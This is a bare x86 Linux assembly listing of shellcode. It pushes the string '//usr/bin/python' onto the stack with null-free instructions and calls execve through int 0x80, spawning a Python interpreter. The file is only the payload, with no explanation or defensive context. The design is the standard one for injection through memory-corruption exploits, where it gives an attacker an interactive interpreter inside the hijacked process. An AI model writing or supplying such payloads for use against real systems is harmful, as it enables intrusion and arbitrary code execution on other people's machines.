section .text
	global _start
_start:
	xor eax , eax
	push eax
	push 0x6e6f6874
	push 0x79702f6e
	push 0x69622f72
	push 0x73752f2f
	mov ebx, esp
	mov ecx, eax
	mov edx, eax
	mov al, 0xb
	int 0x80
